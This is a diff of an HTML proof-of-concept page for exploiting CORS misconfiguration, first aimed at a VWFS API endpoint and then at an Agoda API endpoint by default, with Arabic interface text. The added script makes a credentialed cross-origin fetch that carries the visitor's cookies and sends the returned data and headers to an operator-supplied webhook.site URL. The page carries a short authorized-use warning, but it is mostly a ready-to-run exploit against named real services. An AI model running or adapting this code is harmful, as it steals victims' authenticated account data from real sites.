@@ -1,82 +1,274 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC: VWFS API CORS Misconfiguration</title>
+    <title>CORS Misconfiguration PoC</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f0f2f5; color: #1c1e21; padding: 40px; text-align: center; }
-        .box { background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); padding: 20px; max-width: 800px; margin: auto; border-top: 5px solid #00519E; }
-        h2 { color: #00519E; }
-        pre { background: #2f3542; color: #ffffff; padding: 15px; border-radius: 5px; text-align: left; overflow-x: auto; font-size: 13px; white-space: pre-wrap; word-wrap: break-word; }
-        .status { font-weight: bold; margin: 15px 0; padding: 10px; border-radius: 5px; }
-        .success { background: #e3f9e5; color: #1f8b24; }
-        .error { background: #ffe3e3; color: #bf2121; }
-        .info { background: #e7f3ff; color: #00519E; }
-        code { color: #d63384; font-weight: bold; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #333;
+        }
+        .container {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+        }
+        h1 {
+            color: #667eea;
+            border-bottom: 3px solid #667eea;
+            padding-bottom: 10px;
+        }
+        .info-box {
+            background: #f0f4ff;
+            padding: 15px;
+            border-radius: 5px;
+            margin: 20px 0;
+            border-left: 4px solid #667eea;
+        }
+        .warning {
+            background: #fff3cd;
+            border-left-color: #ffc107;
+            color: #856404;
+        }
+        button {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            margin: 10px 5px;
+            transition: all 0.3s;
+        }
+        button:hover {
+            background: #5568d3;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+        button:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+            transform: none;
+        }
+        #status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 5px;
+            font-weight: bold;
+        }
+        .success {
+            background: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+        }
+        .info {
+            background: #d1ecf1;
+            color: #0c5460;
+            border: 1px solid #bee5eb;
+        }
+        pre {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        .config-section {
+            background: #f8f9fa;
+            padding: 20px;
+            border-radius: 5px;
+            margin: 20px 0;
+        }
+        input[type="text"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 2px solid #ddd;
+            border-radius: 5px;
+            font-family: monospace;
+        }
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #667eea;
+        }
     </style>
 </head>
 <body>
-
-<div class="box">
-    <h2>Exploit Proof-of-Concept (CORS Misconfiguration)</h2>
-    <p><b>Target API:</b> <code>https://b1.api.kons.antrag.vwfs.de/report</code></p>
-    <p><b>Vulnerability:</b> Wildcard Origin with Credentials Allowed</p>
-    
-    <div id="status" class="status info">[*] Initializing Request...</div>
-    
-    <div style="text-align: left; margin-bottom: 10px;"><b>Response Headers & Data:</b></div>
-    <pre id="output">Waiting for server response...</pre>
-</div>
-
-<script>
-    window.onload = function() {
-        const statusDiv = document.getElementById('status');
-        const outputDiv = document.getElementById('output');
+    <div class="container">
+        <h1>🔍 CORS Misconfiguration PoC</h1>
         
-        const target = "https://b1.api.kons.antrag.vwfs.de/report";
+        <div class="info-box warning">
+            <strong>⚠️ تحذير أمني:</strong> استخدم هذا الكود فقط على التطبيقات التي لديك إذن رسمي لاختبارها.
+        </div>
 
-        statusDiv.innerText = "[*] Attempting Cross-Origin Request to VWFS API...";
-
-        fetch(target, {
-            method: "GET",
-            mode: "cors", 
-            credentials: "include",
-            headers: {
-                "Accept": "application/json"
-            }
-        })
-        .then(response => {
-            const corsOrigin = response.headers.get('Access-Control-Allow-Origin');
-            const corsCreds = response.headers.get('Access-Control-Allow-Credentials');
+        <div class="config-section">
+            <h3>⚙️ الإعدادات</h3>
+            <label><strong>Webhook URL (من webhook.site):</strong></label>
+            <input type="text" id="webhookUrl" placeholder="https://webhook.site/your-unique-id">
             
-            let headerInfo = `[HTTP Status: ${response.status}]\n`;
-            headerInfo += `Access-Control-Allow-Origin: ${corsOrigin}\n`;
-            headerInfo += `Access-Control-Allow-Credentials: ${corsCreds}\n`;
-            headerInfo += `-------------------------------------------\n`;
+            <label><strong>Target URL (النقطة الحساسة المراد اختبارها):</strong></label>
+            <input type="text" id="targetUrl" placeholder="https://www.agoda.com/api/cronos/layout/notification/get" value="https://www.agoda.com/api/cronos/layout/notification/get">
+            
+            <label><strong>HTTP Method:</strong></label>
+            <select id="httpMethod" style="width: 100%; padding: 10px; margin: 10px 0; border: 2px solid #ddd; border-radius: 5px;">
+                <option value="GET">GET</option>
+                <option value="POST">POST</option>
+            </select>
+        </div>
 
-            if (response.status === 403 || response.status === 401) {
-                statusDiv.innerText = "[!] VULNERABILITY CONFIRMED: Server accepts wildcard/any origin with credentials!";
-                statusDiv.className = "status success";
-            } else if (response.ok) {
-                statusDiv.innerText = "[+] CRITICAL: Data Leakage Confirmed!";
-                statusDiv.className = "status success";
+        <button onclick="startTest()">🚀 بدء الاختبار</button>
+        <button onclick="clearResults()">🗑️ مسح النتائج</button>
+
+        <div id="status"></div>
+
+        <div id="results" style="margin-top: 20px;"></div>
+    </div>
+
+    <script>
+        function log(message, type = 'info') {
+            const statusDiv = document.getElementById('status');
+            statusDiv.className = type;
+            statusDiv.innerHTML = message;
+        }
+
+        function addToResults(content) {
+            const resultsDiv = document.getElementById('results');
+            resultsDiv.innerHTML += content;
+        }
+
+        function clearResults() {
+            document.getElementById('results').innerHTML = '';
+            document.getElementById('status').innerHTML = '';
+            document.getElementById('status').className = '';
+        }
+
+        async function startTest() {
+            const webhookUrl = document.getElementById('webhookUrl').value.trim();
+            const targetUrl = document.getElementById('targetUrl').value.trim();
+            const httpMethod = document.getElementById('httpMethod').value;
+
+            if (!webhookUrl) {
+                log('❌ الرجاء إدخال Webhook URL من webhook.site', 'error');
+                return;
             }
 
-            return response.text().then(text => headerInfo + text);
-        })
-        .then(data => {
-            outputDiv.innerText = data;
-        })
-        .catch(err => {
-            statusDiv.innerText = "[-] Analysis: Browser blocked the request due to Server Misconfiguration (* vs Credentials)";
-            statusDiv.className = "status info";
-            outputDiv.innerText = "Error: " + err.toString() + 
-                "\n\nTechnical Proof:\nThe server returned 'Access-Control-Allow-Origin: *' " +
-                "and 'Access-Control-Allow-Credentials: true'. \nThis combination is a confirmed Security Misconfiguration.";
-        });
-    };
-</script>
+            if (!targetUrl) {
+                log('❌ الرجاء إدخال Target URL', 'error');
+                return;
+            }
 
+            log('🔄 جاري اختبار CORS...', 'info');
+
+            const startTime = new Date();
+            const testId = 'test_' + Date.now();
+
+            try {
+                // محاولة جلب البيانات من الهدف
+                const response = await fetch(targetUrl, {
+                    method: httpMethod,
+                    credentials: 'include', // مهم جداً لإرسال الكوكيز
+                    headers: {
+                        'Accept': 'application/json',
+                    }
+                });
+
+                const data = await response.text();
+                const endTime = new Date();
+                const duration = endTime - startTime;
+
+                // عرض النتائج في الصفحة
+                addToResults(`
+                    <h3>✅ تم جلب البيانات بنجاح!</h3>
+                    <p><strong>مدة الطلب:</strong> ${duration}ms</p>
+                    <p><strong>حالة الاستجابة:</strong> ${response.status}</p>
+                    <h4>البيانات المستلمة:</h4>
+                    <pre>${escapeHtml(data)}</pre>
+                `);
+
+                log('✅ نجح الاختبار! تم إرسال البيانات إلى Webhook', 'success');
+
+                // إرسال البيانات إلى webhook
+                await sendToWebhook(webhookUrl, {
+                    test_id: testId,
+                    timestamp: startTime.toISOString(),
+                    duration_ms: duration,
+                    target_url: targetUrl,
+                    http_method: httpMethod,
+                    response_status: response.status,
+                    response_headers: Object.fromEntries(response.headers.entries()),
+                    response_data: data,
+                    origin: window.location.origin,
+                    user_agent: navigator.userAgent
+                });
+
+            } catch (error) {
+                const endTime = new Date();
+                const duration = endTime - startTime;
+
+                addToResults(`
+                    <h3>❌ فشل الاختبار</h3>
+                    <p><strong>مدة الطلب:</strong> ${duration}ms</p>
+                    <h4>تفاصيل الخطأ:</h4>
+                    <pre>${escapeHtml(error.toString())}</pre>
+                `);
+
+                log('❌ فشل الاختبار - تحقق من التفاصيل أدناه', 'error');
+
+                // إرسال الخطأ إلى webhook
+                await sendToWebhook(webhookUrl, {
+                    test_id: testId,
+                    timestamp: startTime.toISOString(),
+                    duration_ms: duration,
+                    target_url: targetUrl,
+                    http_method: httpMethod,
+                    error: error.toString(),
+                    origin: window.location.origin,
+                    user_agent: navigator.userAgent
+                });
+            }
+        }
+
+        async function sendToWebhook(webhookUrl, data) {
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    mode: 'no-cors', // مهم لتجنب مشاكل CORS مع webhook
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(data, null, 2)
+                });
+                console.log('✅ تم إرسال البيانات إلى Webhook');
+            } catch (error) {
+                console.error('❌ فشل إرسال البيانات إلى Webhook:', error);
+            }
+        }
+
+        function escapeHtml(text) {
+            const div = document.createElement('div');
+            div.textContent = text;
+            return div.innerHTML;
+        }
+
+        // عرض معلومات الصفحة عند التحميل
+        window.addEventListener('load', () => {
+            console.log('🔍 CORS PoC Tool Loaded');
+            console.log('Current Origin:', window.location.origin);
+        });
+    </script>
 </body>
 </html>
